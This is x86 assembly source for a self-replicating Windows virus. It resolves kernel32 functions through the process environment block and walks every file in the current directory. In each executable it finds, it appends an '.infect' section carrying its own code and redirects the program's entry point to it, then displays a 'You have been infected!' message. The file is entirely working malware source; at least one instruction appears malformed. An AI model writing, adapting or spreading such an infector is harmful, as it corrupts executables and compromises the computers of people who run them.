include misc.inc

.code
exit:
    invoke ExitProcess, 0

inject SEGMENT read write execute
	data_start EQU $
	
	; .data
	strGMFN db 'GetModuleFileNameA', 0
    strF1A db 'FindFirstFileA', 0
    strFNA db 'FindNextFileA', 0
    strFC db 'FindClose', 0
    strCFA db 'CreateFileA', 0
    strSFP db 'SetFilePointerEx', 0
    strCH db 'CloseHandle', 0
    strRF db 'ReadFile', 0
    strWF db 'WriteFile', 0
    strLLA db 'LoadLibraryA', 0
    strGPA db 'GetProcAddress', 0
    stru32dll db 'user32.dll', 0
    strMBA db 'MessageBoxA', 0
    
    strQuery db '*', 0
	strCaption db 'Notice', 0
    strContent db 'You have been infected!', 0
    
    ishName db '.infect', 0 ; MUST be 8 bytes in length
    ishVirtualSize dd 0
    ishVirtualAddress dd 0
    ishSizeOfRawData dd 0
    ishPointerToRawData dd 0
    ishPointerToRelocations dd 0
    ishPointerToLineNumbers dd 0
    ishNumberOfRelocations dw 0
    ishNumberOfLinenumbers dw 0
    ishCharacteristics dd 60000060h
    ; IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ
	; 0x00000020 | 0x00000040 | 0x20000000 | 0x40000000
    
    ; .data?
    tempDword dd 0
    tempDword2 dd 0
    temp320B db 320 DUP(0) ; To store WIN32_FIND_DATAA
    
    entrySectionOffset EQU $ - data_start
    
; .code
start:
    call here
    here:
        
    mov ebp, esp
    
    mov eax, stack_reserved
    imul eax, regSz
    sub esp, eax
    
    mov edx, [ebp] ; selfEntry + 1 + 4 (call here is 5 bytes long)
    sub edx, 5 ; eax = selfEntry
    toStack selfEntry, edx
    
    sub edx, entrySectionOffset
    toStack selfSection, edx
    
    ; Find kernel32.dll
    ASSUME FS:NOTHING
    mov ebx, fs:30h
    mov ebx, [ebx + 0Ch]
    mov ebx, [ebx + 14h]
    mov ebx, [ebx]
    mov ebx, [ebx]
    mov ebx, [ebx + 10h]
	toStack kernel32dll, ebx ; BaseAddress of kernel32.dll
    
    mov edi, [ebx + 3Ch]
    add edi, ebx
    mov edi, [edi + 78h] ; 24 (18h) + 96 (60h) = RVA of kernel32.dll Export Table
    add edi, ebx
    mov ecx, [edi + 24h]
    add ecx, ebx
    toStack OrdinalTbl, ecx ; VA of Ordinal Table
    
    mov esi, [edi + 20h]
    add esi, ebx
    toStack NamePtrTbl, esi ; VA of Name Pointer Table
    
    mov edx, [edi + 1Ch]
    add edx, ebx
    toStack AddrTbl, edx ; VA of Address Table
    
    mov edx, [edi + 14h]
    toStack k32NumFunc, edx
    
    k32import offset strF1A
    toStack ffind1
    
    k32import offset strFNA
    toStack ffind2
    
    k32import offset strFC
    toStack ffind0
    
    k32import offset strCFA
    toStack fopen
    
    k32import offset strSFP
    toStack fseek
    
    k32import offset strCH
    toStack fclose
    
    k32import offset strRF
    toStack fread
    
    k32import offset strWF
    toStack fwrite
    
    k32import offset strGMFN
    toStack argv0
    
    k32import offset strLLA
    toStack loadlib
    
   	push daccess(offset stru32dll)
   	call fromStack(loadlib)
    toStack user32dll
    
    k32import offset strGPA
    toStack getaddr
    
    push daccess(offset strMBA)
    push fromStack(user32dll)
    call fromStack(getaddr)
    toStack msgbox
    
    ; Get name of current process
    invoke fromStack(argv0),
    		0, 							; Current process
    		daccess(offset temp320B), 	; To store output
    		260							; MAX_PATH
    
    ; Open current file for READing
    invoke fromStack(fopen),
    		daccess(offset temp320B),
    		40000000h, 		; GENERIC_READ
	    	0, 				; No sharing
	    	0,
	    	4,				; OPEN_ALWAYS
	    	80h, 			; FILE_ATTRIBUTE_NORMAL
	    	0
	toStack selfHand
	
	; Find inject section header of current file
	getval fromStack(selfHand), 4, SEEK_SET, 3Ch
	mov ebx, vaccess(tempDword) ; ebx = e_lfanew
	mov eax, ebx
	add eax, 6
	getval fromStack(selfHand), 2, SEEK_SET, eax
	mov edx, vaccess(tempDword) ; edx = NumberOfSections
	mov eax, ebx
	add eax, 20
	getval fromStack(selfHand), 2, SEEK_SET, eax
	add ebx, vaccess(tempDword) ; ebx = SectionTable #1
	mov daccess(temp320B), 0
	invoke fromStack(fseek), fromStack(selfHand), ebx, 0, SEEK_SET
	section_header_loop:
		invoke fromStack(fread),
				fromStack(selfHand),
				daccess(temp320B),
				40,
				daccess(tempDword2),
				0
		mov esi, daccess(temp320B)
		mov edi, daccess(ishName)
		mov ecx, 8
		cld
		repe cmpsb
		jz section_header_found
		
		dec edx
		cmp edx, 0
	ja section_header_loop
	
	section_header_found:
	toStack selfVirtualSize, vaccess(offset temp320B + 8)
	toStack selfPointerToRawData, vaccess(offset temp320B + 20)
    
    ; Find first file in directory
    push daccess(offset temp320B)
    push daccess(offset strQuery)
    call fromStack(ffind1)
    toStack fileHand
    
    openFile:
		push 0
		push 80h ; FILE_ATTRIBUTE_NORMAL
		push 4 ; OPEN_ALWAYS
		push 0
		push 0 ; No sharing
		push 40000000h OR 80000000h ; GENERIC_READ | GENERIC_WRITE
		push daccess(offset temp320B) + 2Ch ; cFileName in WIN32_FIND_DATAA
		call fromStack(fopen)
		toStack tgHand

		; Obtain and verify magic bytes "MZ"
		getval fromStack(tgHand), 2
		cmp tempDword, 5a4dh
		jne nextFile ; Not a PE file

		; e_lfanew
		getval fromStack(tgHand), 4, SEEK_SET, 3Ch
		toStack lfanew, vaccess(tempDword)

		; Insert new NumberOfSections
		mov ecx, fromStack(lfanew)
		add ecx, 6
		getval fromStack(tgHand), 2, SEEK_SET, ecx
		toStack NumberOfSections, vaccess(tempDword)
		inc vaccess(tempDword)
		invoke fromStack(fseek), fromStack(tgHand), ecx, 0, SEEK_CUR
		invoke fromStack(fwrite), fromStack(tgHand), daccess(tempDword), 2, daccess(tempDword2), 0

		add ecx, 20 - 6 ; = lfanew + 20
		getval fromStack(tgHand), 2, SEEK_SET, ecx
		toStack SizeOfOptionalHeader, vaccess(tempDword)

		add ecx, 4 ; = lfanew + 24 = ioh_offset
		toStack ioh_offset, ecx
		getval fromStack(tgHand), 2, SEEK_SET, ecx
		toStack Magic, vaccess(tempDword)

		mov ecx, fromStack(ioh_offset)
		add ecx, 16
		getval fromStack(tgHand), 4, SEEK_SET, ecx
		toStack AddressOfEntryPoint, vaccess(tempDword)

		mov ecx, fromStack(ioh_offset)
		add ecx, 32
		getval fromStack(tgHand), 4, SEEK_SET, ecx
		toStack SectionAlignment, vaccess(tempDword)

		getval fromStack(tgHand), 4
		toStack FileAlignment, vaccess(tempDword)

		; DWORD lastish_offset = ioh_offset + SizeOfOptionalHeader + 40 * (NumberOfSections - 1);
		mov ecx, fromStack(ioh_offset)
		add fromStack(SizeOfOptionalHeader)
		mov edx, fromStack(NumberOfSections)
		dec edx
		imul edx, 40 ; Size of 1 section header
		add ecx, edx
		toStack lastish_offset, ecx

		; Obtain lastish.VirtualAddress
		add ecx, 12
		getval fromStack(tgHand), 4, SEEK_SET, ecx
		mov edx, vaccess(tempDword)

		; Obtain lastish.SizeOfRawData
		getval fromStack(tgHand), 4
		add edx, vaccess(tempDword)

		closest edx, fromStack(SectionAlignment)
		mov daccess(ishVirtualAddress), eax

		mov ecx, fromStack(lastish_offset)
		add ecx, 40
		toStack newish_offset, ecx

		invoke fromStack(fseek), fromStack(tgHand), 0, 0, SEEK_END

		; Pad end of file to match FileAlignment
		mov ebx, eax
		inc eax
		closest	eax, fromStack(FileAlignment)
		mov ecx, eax
		sub ecx, ebx
		mov daccess(tempDword), 0
		pad1_loop:
			invoke fromStack(fwrite), fromStack(tgHand), daccess(tempDword), 1, daccess(tempDword2), 0
			dec ecx
			cmp ecx, 0
		ja pad1_loop
		invoke fromStack(fseek), fromStack(tgHand), 0, 0, SEEK_CUR
		mov daccess(ishPointerToRawData), eax

		; Copy .inject
		mov ecx, fromStack(selfVirtualSize)
		invoke fromStack(fseek), fromStack(selfHand), fromStack(selfPointerToRawData), 0, SEEK_SET
		copy_start:
			cmp ecx, 320
			jbe copy_end
			invoke fromStack(fread), fromStack(selfHand), daccess(temp320B), 320, daccess(tempDword2), 0
			invoke fromStack(fwrite), fromStack(tgHand), daccess(temp320B), 320, daccess(tempDword2), 0
			sub ecx, 320
		jmp copy_start
		copy_end:
			sub ecx, 6 ; No copying last jmp instruction to old AddressOfEntryPoint (along with nop's)
			invoke fromStack(fread), fromStack(selfHand), daccess(temp320B), ecx, daccess(tempDword2), 0
			invoke fromStack(fwrite), fromStack(tgHand), daccess(temp320B), ecx, daccess(tempDword2), 0
			
			; Final jmp instruction:
			; FF 65 XX = jmp [ebp + disp8] (3 bytes) (for 32-bit, only usable if stack_reserved < 32 = 0x20)
			; FF A5 XX XX XX XX = jmp [ebp + disp32] (6 bytes)
			mov vaccess(tempDword), 0A5FFh
			invoke fromStack(fwrite), fromStack(tgHand), daccess(tempDword), 2, daccess(tempDword2), 0
			mov vaccess(tempDword), stackAddr(AddressOfEntryPoint)
			invoke fromStack(fwrite), fromStack(tgHand), daccess(tempDword), 4, daccess(tempDword2), 0
			
		; Register VirtualSize & SizeOfRawData
		invoke fromStack(fseek), fromStack(tgHand), 0, 0, SEEK_CUR ; Obtain current position
		sub eax, vaccess(ishPointerToRawData)
		mov daccess(ishVirtualSize), eax	
		closest	eax, fromStack(FileAlignment)
		mov daccess(ishSizeOfRawData), eax

		; Pad section
		mov ecx, eax
		sub ecx, vaccess(ishVirtualSize)
		mov daccess(tempDword), 0
		pad2_loop:
			invoke fromStack(fwrite), fromStack(tgHand), daccess(tempDword), 1, daccess(tempDword2), 0
			dec ecx
			cmp ecx, 0
		ja pad2_loop

		; Write new Section Header
		invoke fromStack(fseek), fromStack(tgHand), fromStack(newish_offset), 0, SEEK_SET
		invoke fromStack(fwrite), fromStack(tgHand), daccess(ishName), 40, daccess(tempDword2), 0

		; Edit SizeOfImage
		mov ebx, fromStack(ioh_offset)
		add ebx, 56
		getval fromStack(tgHand), 4, SEEK_SET, ebx
		mov eax, vaccess(tempDword)
		add eax, vaccess(ishSizeOfRawData)
		closest eax, fromStack(SectionAlignment)
		mov daccess(tempDword), eax
		invoke fromStack(fseek), fromStack(tgHand), ebx, 0, SEEK_SET
		invoke fromStack(fwrite), fromStack(tgHand), daccess(tempDword), 4, daccess(tempDword2), 0
		
		; Edit AddressOfEntryPoint
		sub ebx, 56 - 16
		mov edx, fromStack(ishVirtualAddress)
		add edx, entrySectionOffset
		mov daccess(tempDword), edx
		invoke fromStack(fseek), fromStack(tgHand), ebx, 0, SEEK_SET
		invoke fromStack(fwrite), fromStack(tgHand), daccess(tempDword), 4, daccess(tempDword2), 0

	nextFile:
		invoke fromStack(fclose), fromStack(tgHand)

		invoke fromStack(ffind2), fromStack(fileHand), daccess(offset temp320B)
		cmp eax, 0
    jne openFile
    
    ; No more file to write
    invoke fromStack(fclose), fromStack(selfHand)
    invoke fromStack(ffind0), fromStack(fileHand)
    
    ; Malware here
    push 2030h ; MB_OK | MB_ICONWARNING | MB_TASKMODAL
    push daccess(strCaption)
    push daccess(strContent)
    push 0
    call fromStack(msgbox)
    
    to_exit:
    mov esp, ebp
    jmp exit ; expected to be 5 bytes
    nop
    
inject ENDS
end start
